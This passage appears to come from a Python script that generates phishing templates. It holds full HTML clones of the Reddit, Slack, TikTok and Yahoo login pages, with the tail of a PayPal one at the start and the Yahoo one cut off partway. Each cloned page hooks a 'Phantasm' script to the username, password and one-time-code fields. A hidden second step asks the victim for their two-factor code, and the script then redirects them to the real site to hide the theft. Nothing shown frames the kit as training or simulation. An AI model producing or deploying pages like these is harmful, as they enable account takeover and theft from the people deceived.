        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>"""
save_template("paypal", paypal_html)

# REDDIT
reddit_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Reddit</title>
    <link rel="icon" type="image/png" href="https://www.redditstatic.com/desktop2x/img/favicon/favicon-32x32.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
            margin: 0;
            display: flex;
            height: 100vh;
            background-color: #fff;
        }

        .art-side {
            display: none;
            width: 140px;
            background-image: url('https://www.redditstatic.com/accountmanager/d26b88950663.png');
            background-size: cover;
            background-position: center;
            height: 100%;
        }

        @media (min-width: 800px) {
            .art-side {
                display: block;
            }
        }

        .container {
            flex: 1;
            padding: 24px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            max-width: 400px; /* Limit width for better look on large screens */
            margin-left: 20px;
        }
        
        @media (min-width: 800px) {
            .container {
                margin-left: 40px;
            }
        }

        .logo {
            margin-bottom: 24px;
        }
        .logo img {
            height: 32px;
        }

        h1 {
            font-size: 18px;
            font-weight: 500;
            line-height: 22px;
            margin-bottom: 8px;
            margin-top: 0;
        }

        p {
            font-size: 14px;
            line-height: 18px;
            margin-bottom: 24px;
            color: #1a1a1b;
        }
        
        a {
            color: #0079d3;
            text-decoration: none;
            font-weight: 600;
        }
        
        a:hover {
            text-decoration: underline;
        }

        .auth-buttons {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 280px;
        }

        .auth-btn {
            border: 1px solid #dadce0;
            border-radius: 20px;
            padding: 10px;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            color: #1a1a1b;
            font-family: inherit;
        }

        .auth-btn:hover {
            background-color: #f6f7f8;
            border-color: #dadce0;
        }
        
        .auth-btn img {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            position: absolute;
            left: 10px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            width: 100%;
            max-width: 280px;
        }

        .divider span {
            color: #878a8c;
            font-size: 14px;
            margin: 0 16px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-top: 1px solid #edeff1;
        }

        /* Floating Label Styles */
        .input-group {
            position: relative;
            margin-bottom: 16px;
            width: 100%;
            max-width: 280px;
        }

        .input-group input {
            width: 100%;
            padding: 22px 12px 10px;
            border: 1px solid #edeff1;
            border-radius: 4px;
            background-color: #f6f7f8;
            font-size: 14px;
            box-sizing: border-box;
            height: 48px;
            transition: all 0.2s ease-in-out;
            outline: none;
        }

        .input-group input:focus {
            background-color: #fff;
            border-color: #0079d3;
        }
        
        .input-group input:not(:placeholder-shown) {
            background-color: #fff;
        }

        .input-group label {
            position: absolute;
            top: 14px;
            left: 12px;
            font-size: 10px;
            color: #a5a4a4;
            pointer-events: none;
            transition: all 0.2s ease-in-out;
            text-transform: uppercase;
            font-weight: 600;
            letter-spacing: 0.5px;
            transform-origin: left top;
            transform: translateY(0);
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 10px;
            color: #a5a4a4;
        }
        
        /* When empty and not focused, label should look like placeholder */
        .input-group input:placeholder-shown:not(:focus) + label {
            top: 16px;
            font-size: 12px;
            text-transform: none;
            font-weight: 400;
            color: #1a1a1b; /* Darker to look like placeholder text */
            letter-spacing: normal;
        }
        
        .submit-btn {
            width: 100%;
            max-width: 280px;
            background-color: #0079d3;
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            height: 40px;
            margin-top: 8px;
        }
        
        .submit-btn:hover {
            background-color: #0061a8;
        }
        
        .submit-btn:disabled {
            background-color: #0079d3;
            opacity: 0.5;
            cursor: not-allowed;
        }

        .footer-text {
            margin-top: 24px;
            font-size: 12px;
            line-height: 16px;
            color: #1a1a1b;
            max-width: 280px;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #ea0027;
            font-size: 12px;
            margin-bottom: 10px;
            display: none;
            max-width: 280px;
        }

    </style>
</head>
<body>
    <div class="art-side"></div>
    <div class="container" id="step-1">
        <div class="logo">
            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="height: 32px; width: 32px; border-radius: 50%; background: #FF4500;">
                <g>
                    <circle cx="10" cy="10" fill="#FF4500" r="10"></circle>
                    <path d="M16.67,10A3.32,3.32,0,0,0,13.34,6.68,3.31,3.31,0,0,0,11,7.63,8.39,8.39,0,0,0,6,6.23V4.13L10.58,5.1a1.66,1.66,0,1,0,.43-1.07l-5.1-1.08a.38.38,0,0,0-.45.28L5.27,6.22A8.35,8.35,0,0,0,2.34,7.62,3.33,3.33,0,0,0,0,10a3.36,3.36,0,0,0,1.13,2.5,4.92,4.92,0,0,0-.11,1.07c0,2.54,2.69,4.6,6,4.6s6-2.06,6-4.6a5,5,0,0,0-.11-1.07A3.36,3.36,0,0,0,16.67,10Z" fill="#FFF"></path>
                </g>
            </svg>
        </div>
        
        <h1>Log in</h1>
        <p>By continuing, you agree to our <a href="#">User Agreement</a> and acknowledge that you understand the <a href="#">Privacy Policy</a>.</p>
        
        <div class="auth-buttons">
            <div class="auth-btn">
                <img src="https://www.redditstatic.com/accountmanager/9e924d52140c.svg" alt="Google">
                Continue with Google
            </div>
            <div class="auth-btn">
                <img src="https://www.redditstatic.com/accountmanager/13c77d544458.svg" alt="Apple">
                Continue with Apple
            </div>
        </div>
        
        <div class="divider">
            <span>OR</span>
        </div>
        
        <div class="error-message" id="error-msg">Incorrect username or password</div>

        <form style="width: 100%;">
            <div class="input-group">
                <input type="text" id="username" placeholder=" " required>
                <label for="username">Username</label>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>
            
            <div style="margin-bottom: 24px; font-size: 12px;">
                <a href="#">Forgot your username or password?</a>
            </div>
            
            <div style="margin-bottom: 16px; font-size: 12px; color: #1a1a1b;">
                New to Reddit? <a href="#">Sign up</a>
            </div>

            <button type="submit" class="submit-btn" id="btn-login">
                Log In
            </button>
        </form>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.reddit.com/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp',
                    errorMsg: '#error-msg'
                }
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>
"""
save_template("reddit", reddit_html)

# SLACK
slack_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | Slack</title>
    <link rel="icon" href="https://a.slack-edge.com/80588/marketing/img/meta/favicon-32.png" sizes="32x32" type="image/png">
    <style>
        @font-face {
            font-family: 'Slack-Lato';
            src: url('https://a.slack-edge.com/bv1-9/lato-regular-webfont-7b240b3.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Slack-Lato';
            src: url('https://a.slack-edge.com/bv1-9/lato-bold-webfont-49d685e.woff2') format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        
        body {
            font-family: "Slack-Lato", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #fff;
            color: #1d1c1d;
            height: 100vh;
        }

        header {
            width: 100%;
            padding: 40px 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo img {
            height: 34px;
        }

        .main-content {
            width: 100%;
            max-width: 800px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 20px;
            box-sizing: border-box;
            position: relative;
        }

        h1 {
            font-size: 48px;
            font-weight: 700;
            letter-spacing: -0.75px;
            margin-bottom: 10px;
            text-align: center;
            line-height: 56px;
        }

        .subtitle {
            font-size: 18px;
            line-height: 27px;
            margin-bottom: 32px;
            color: #454245;
            text-align: center;
            max-width: 700px;
        }
        
        .subtitle a {
            color: #1264a3;
            text-decoration: none;
        }
        
        .subtitle a:hover {
            text-decoration: underline;
        }

        .auth-container {
            width: 100%;
            max-width: 400px;
        }

        .social-btn {
            width: 100%;
            height: 44px;
            border: 2px solid #1d1c1d;
            border-radius: 4px;
            background: #fff;
            font-size: 18px;
            font-weight: 700;
            color: #1d1c1d;
            cursor: pointer;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            position: relative;
        }

        .social-btn:hover {
            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
            background-color: #f8f8f8;
        }
        
        .social-btn img {
            width: 20px;
            height: 20px;
            margin-right: 12px;
            position: absolute;
            left: 20px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            width: 100%;
        }

        .divider span {
            padding: 0 20px;
            color: #1d1c1d;
            font-size: 15px;
            background: #fff;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-top: 1px solid #dddddd;
        }

        .input-wrapper {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 11px 12px 13px;
            border: 1px solid #868686;
            border-radius: 4px;
            font-size: 18px;
            box-sizing: border-box;
            color: #1d1c1d;
            height: 44px;
            transition: box-shadow 70ms ease-out, border-color 70ms ease-out;
        }

        input:focus {
            border-color: #1264a3;
            box-shadow: 0 0 0 4px rgba(29,155,209,0.3);
            outline: none;
        }
        
        input::placeholder {
            color: #868686;
        }

        .signin-btn {
            background-color: #4a154b;
            color: #fff;
            border: none;
            border-radius: 4px;
            width: 100%;
            height: 44px;
            font-size: 18px;
            font-weight: 900;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .signin-btn:hover {
            background-color: #3f1240;
        }
        
        .signin-btn:disabled {
            background-color: #dddddd;
            color: #1d1c1d;
            cursor: not-allowed;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            background-color: #fbecec;
            border: 1px solid #e01e5a;
            border-radius: 4px;
            padding: 12px 16px;
            margin-bottom: 24px;
            display: none;
            align-items: flex-start;
        }
        
        .error-icon {
            color: #e01e5a;
            margin-right: 8px;
            margin-top: 2px;
        }
        
        .error-text {
            color: #1d1c1d;
            font-size: 15px;
            line-height: 22px;
        }

        footer {
            margin-top: auto;
            padding: 32px 0;
            width: 100%;
            text-align: center;
            background-color: #f8f8f8;
            border-top: 1px solid #e6e6e6;
        }
        
        footer ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        footer li {
            margin: 0 16px;
        }
        
        footer a {
            color: #696969;
            text-decoration: none;
            font-size: 14px;
            font-weight: 700;
        }
        
        footer a:hover {
            color: #1264a3;
            text-decoration: underline;
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 600px) {
            h1 {
                font-size: 32px;
                line-height: 38px;
            }
            .subtitle {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <img src="https://a.slack-edge.com/80588/marketing/img/icons/icon_slack_hash_colored.png" alt="Slack" style="height: 34px; margin-right: 10px; vertical-align: middle;">
            <span style="font-size: 24px; font-weight: 900; vertical-align: middle; letter-spacing: -1px;">slack</span>
        </div>
    </header>

    <div class="main-content">
        <div id="step-1">
            <h1>Log in to Slack</h1>
            <div class="subtitle">
                We suggest using the <strong>email address you use at work.</strong>
            </div>

            <div class="auth-container">
                <button class="social-btn">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
                    Log in with Google
                </button>
                <button class="social-btn">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
                    Log in with Apple
                </button>

                <div class="divider">
                    <span>OR</span>
                </div>
                
                <div class="error-message" id="error-msg">
                    <span class="error-icon">⚠️</span>
                    <span class="error-text">Sorry, you entered an incorrect email or password.</span>
                </div>

                <form id="login-form">
                    <div class="input-wrapper">
                        <input type="email" id="email" placeholder="name@work-email.com" required>
                    </div>
                    
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>

                    <button type="button" class="signin-btn" id="btn-login">
                        Log In
                    </button>
                    
                    <div style="margin-top: 24px; text-align: center;">
                        <div style="margin-bottom: 8px; color: #454245; font-size: 15px;">
                            <input type="checkbox" id="remember" style="width: auto; margin-right: 8px; vertical-align: middle;">
                            <label for="remember" style="vertical-align: middle;">Remember me</label>
                        </div>
                        <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Forgot password?</a>
                    </div>
                </form>
            </div>
        </div>

        <!-- OTP Section (Hidden initially) -->
        <div id="step-3-otp" class="hidden auth-container" style="text-align: center;">
            <h1 style="font-size: 32px; margin-bottom: 20px;">Check your email</h1>
            <div class="subtitle">
                We've sent a 6-digit code to your email. The code expires shortly, so please enter it soon.
            </div>

            <div class="input-wrapper">
                <input type="text" id="otp-input" placeholder="Enter 6-digit code" 
                       style="text-align: center; letter-spacing: 4px; font-size: 24px;" 
                       maxlength="6">
            </div>

            <button type="button" class="signin-btn" id="btn-otp-submit">
                Verify Code
            </button>
            
            <div style="margin-top: 24px;">
                <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Didn't receive a code?</a>
            </div>
        </div>
    </div>

    <footer>
        <ul>
            <li><a href="#">Privacy & Terms</a></li>
            <li><a href="#">Contact Us</a></li>
            <li><a href="#">Change Region</a></li>
        </ul>
    </footer>

    <!-- Phantasm Engine -->
    <script src="/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://slack.com/signin',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1', // Login container
                    step3: '#step-3-otp', // OTP container
                    errorMsg: '#error-msg'
                }
            });
        });
    </script>
</body>
</html>
"""
save_template("slack", slack_html)

# TIKTOK
tiktok_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <link rel="icon" href="https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/images/logo-7328701c910ebbcc.svg" type="image/svg+xml">
    <style>
        @font-face {
            font-family: 'TikTokFont';
            src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Regular-b695e8.woff2') format('woff2');
            font-weight: 400;
        }
        @font-face {
            font-family: 'TikTokFont';
            src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Bold-2f5b61.woff2') format('woff2');
            font-weight: 700;
        }
        @font-face {
            font-family: 'TikTokFont';
            src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Semibold-d00cda.woff2') format('woff2');
            font-weight: 600;
        }

        body {
            font-family: "TikTokFont", "Proxima Nova", Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
            color: rgba(22, 24, 35, 1);
        }

        .container {
            width: 100%;
            max-width: 480px;
            text-align: center;
            padding: 0 24px;
        }

        .logo-header {
            margin-bottom: 20px;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 16px;
            margin-top: 0;
            color: rgba(22, 24, 35, 1);
        }

        .subtitle {
            font-size: 15px;
            color: rgba(22, 24, 35, 0.5);
            margin-bottom: 32px;
        }

        .login-methods {
            display: flex;
            flex-direction: column;
            gap: 12px;
            max-height: 400px;
            overflow-y: auto;
        }

        .method {
            display: flex;
            align-items: center;
            justify-content: center; /* Centered content */
            padding: 12px 16px;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 2px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
            background: #fff;
            color: rgba(22, 24, 35, 1);
            font-size: 15px;
            height: 44px;
            box-sizing: border-box;
            transition: background-color 0.2s;
        }

        .method:hover {
            background-color: rgba(22, 24, 35, 0.03);
        }
        
        .method-icon {
            position: absolute;
            left: 16px;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .form-container {
            text-align: left;
            margin-top: 20px;
            display: none; /* Hidden by default, shown when 'Use phone / email / username' is clicked */
        }
        
        .form-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        
        .form-title {
            font-size: 24px;
            font-weight: 700;
        }

        .input-group {
            margin-bottom: 16px;
        }
        
        .label {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
        }

        input {
            width: 100%;
            padding: 12px;
            background: rgba(22, 24, 35, 0.06);
            border: 1px solid transparent;
            border-radius: 4px;
            margin-bottom: 0;
            box-sizing: border-box;
            font-size: 16px;
            caret-color: #fe2c55;
        }

        input:focus {
            background: rgba(22, 24, 35, 0.03);
            border-color: rgba(22, 24, 35, 0.12);
            outline: none;
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 20px;
            height: 20px;
            opacity: 0.5;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }
        
        .submit-btn:hover {
            background-color: #ef2950;
        }

        .submit-btn:disabled {
            background-color: rgba(22, 24, 35, 0.06);
            color: rgba(22, 24, 35, 0.34);
            cursor: not-allowed;
        }

        .footer {
            margin-top: 0;
            padding: 24px;
            background-color: #fff;
            border-top: 1px solid rgba(22, 24, 35, 0.12);
            width: 100%;
            position: fixed;
            bottom: 0;
            left: 0;
            text-align: center;
            font-size: 15px;
            display: flex;
            justify-content: center;
        }
        
        .footer span {
            color: rgba(22, 24, 35, 0.5);
            margin-right: 6px;
        }
        
        .footer a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #fe2c55;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
        
        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            margin-right: 10px;
        }
        
        /* Specific QR Code style simulation */
        .qr-section {
            display: none; /* Can be toggled */
            flex-direction: column;
            align-items: center;
        }

    </style>
</head>
<body>
    <div class="container" id="main-menu">
        <h1>Log in to TikTok</h1>
        <div class="subtitle">Manage your account, check notifications, comment on videos, and more.</div>
        
        <div class="login-methods">
            <div class="method" onclick="showForm()">
                <div class="method-icon">
                    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24 4C12.9543 4 4 12.9543 4 24C4 35.0457 12.9543 44 24 44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4Z" fill="#161823" fill-opacity="1"/><path d="M35 15H13V19H35V15Z" fill="white"/><path d="M35 23H13V27H35V23Z" fill="white"/><path d="M25 31H13V35H25V31Z" fill="white"/></svg>
                </div>
                Use phone / email / username
            </div>
            <div class="method">
                <div class="method-icon">
                    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24 4C14.0589 4 6 12.0589 6 22V26C6 35.9411 14.0589 44 24 44C33.9411 44 42 35.9411 42 26V22C42 12.0589 33.9411 4 24 4Z" fill="#1877F2"/><path d="M28.0617 31.5033L28.6186 26.0467H24.3167V22.9533C24.3167 21.5717 25.1767 20.8983 26.8967 20.8983H28.895V16.7367C28.895 16.7367 27.245 16.5033 25.4383 16.5033C21.905 16.5033 19.6667 18.5033 19.6667 22.3167V26.0467H16.0017V31.5033H19.6667V43.8967C20.9767 44.1567 22.3367 44.29 23.7317 44.29C24.8733 44.29 25.9867 44.1983 27.0683 44.02V31.5033H28.0617Z" fill="white"/></svg>
                </div>
                Continue with Facebook
            </div>
            <div class="method">
                <div class="method-icon">
                    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 24C44 35.0457 35.0457 44 24 44C12.9543 44 4 35.0457 4 24C4 12.9543 12.9543 4 24 4C35.0457 4 44 12.9543 44 24Z" fill="#161823"/><path d="M26.8333 15.6833H23.5167C22.05 15.6833 20.8833 16.85 20.8833 18.3167V20.5H25.2667L24.5333 24.8833H20.8833V35.1667H16.5V24.8833H13.2167V20.5H16.5V18.3167C16.5 14.8333 19.2667 12.0667 22.75 12.0667H26.8333V15.6833Z" fill="white"/></svg>
                </div>
                Continue with Google
            </div>
            <div class="method">
                <div class="method-icon">
                    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24 4C12.9543 4 4 12.9543 4 24C4 35.0457 12.9543 44 24 44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4Z" fill="black"/><path d="M28.3 19.1L35.5 12H32L26.3 17.6L22.2 12H13L21.4 23.4L13.5 31.2H17L23.4 24.9L28 31.2H37.2L28.3 19.1ZM25.9 21.5L25.1 20.4L17.8 10.3H15.1L23.9 22.4L24.7 23.5L32.4 34.2H35.1L25.9 21.5Z" fill="white"/></svg>
                </div>
                Continue with Twitter
            </div>
            <div class="method">
                <div class="method-icon">
                    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M37.89 26.06C38.08 31.62 42.94 33.68 43 33.72C42.96 33.84 42.27 36.21 40.59 38.66C39.13 40.78 37.62 42.89 35.25 42.93C32.96 42.97 32.22 41.57 29.56 41.57C26.9 41.57 26.08 42.93 23.87 42.97C21.58 43.01 19.95 40.73 18.49 38.62C15.5 34.3 13.22 26.42 16.27 21.13C17.78 18.51 20.47 16.85 23.23 16.81C25.44 16.77 27.54 18.3 28.9 18.3C30.25 18.3 32.81 16.48 35.53 16.73C36.67 16.78 39.87 17.14 41.97 20.21C41.87 20.27 37.95 22.56 37.89 26.06ZM30.73 13.88C31.95 12.4 32.77 10.34 32.54 8.3C30.76 8.37 28.61 9.49 27.34 10.97C26.19 12.29 25.19 14.53 25.46 16.49C27.44 16.64 29.51 15.35 30.73 13.88Z" fill="black"/></svg>
                </div>
                Continue with Apple
            </div>
        </div>
    </div>

    <div class="container" id="login-form" style="display: none;">
        <div class="form-header">
            <button class="back-btn" onclick="showMenu()">
                <svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22.1122 10.8284L23.5264 12.2426L14.1226 21.6464H38.5V23.6464H14.1226L23.5264 33.0503L22.1122 34.4645L9.64775 22.0001L22.1122 10.8284Z" fill="#161823"/></svg>
            </button>
            <div class="form-title">Log in</div>
            <div style="width: 24px;"></div> <!-- Spacer -->
        </div>

        <form>
            <div class="input-group">
                <label class="label">Phone / Email / Username</label>
                <input type="text" id="username" placeholder="Email or Username" required>
            </div>
            
            <div class="input-group">
                <div class="password-container">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="error-message" id="error-msg">Incorrect username or password</div>
            </div>
            
            <a href="#" style="color: rgba(22, 24, 35, 0.75); font-size: 12px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px;">Forgot password?</a>

            <button type="submit" class="submit-btn" id="btn-login">
                Log in
            </button>
        </form>
    </div>

    <div class="footer">
        <span>Don't have an account?</span>
        <a href="#">Sign up</a>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        function showForm() {
            document.getElementById('main-menu').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
        }

        function showMenu() {
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('main-menu').style.display = 'block';
        }

        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.tiktok.com/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#login-form',
                    step3: '#step-3-otp',
                    errorMsg: '#error-msg'
                }
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>
"""
save_template("tiktok", tiktok_html)

# YAHOO
yahoo_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo</title>
    <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            height: 100vh;
        }

        .login-side {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            box-sizing: border-box;
            background-color: #fff;
        }

        .ad-side {
            display: none;
            width: 50%;
            background-color: #f0f3f7;
            background-image: url('https://s.yimg.com/wm/login/2-0-12/assets/login-hero-2.svg'); /* Fallback or specific image */
            background-size: cover;
            background-position: center;
        }

        @media (min-width: 1024px) {
            .ad-side {
                display: block;
                width: 40%;
            }
            .login-side {
                width: 60%;
            }
        }

        .login-box {
            width: 100%;
            max-width: 360px;
            text-align: center;
        }

        .logo-center {
            margin-bottom: 30px;
        }
        
        .logo-center img {
            height: 36px;
        }

        .step-container {
            transition: opacity 0.3s ease-in-out;
        }

        .hidden {
            display: none;
            opacity: 0;
        }

        .fade-in {
            animation: fadeIn 0.5s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #26282a;
            margin-top: 0;
        }

        p {
            font-size: 16px;
            color: #26282a;
            margin-bottom: 40px;
        }
        
        .user-greeting {
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 6px;
            color: #26282a;
        }
        
        .user-email-display {
            font-size: 14px;
            font-weight: 600;
            color: #26282a;
            margin-bottom: 40px;
        }

        .input-group {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
        }

        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #e0e4e9;
            padding: 12px 0 4px;
            font-size: 16px;
            color: #26282a;
            box-sizing: border-box;
            transition: border-bottom-color 0.2s;
            background: transparent;
            height: 32px;
        }

        input:focus {
            border-bottom-color: #188fff;
            outline: none;
        }

        label {
            position: absolute;
            left: 0;
            top: 10px;
            color: #6e7780;
            font-size: 16px;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        input:focus ~ label,
        input:not(:placeholder-shown) ~ label {
            top: -10px;
            font-size: 12px;
            color: #6e7780;
        }
        
        .password-toggle {
            position: absolute;
            right: 0;
            top: 8px;
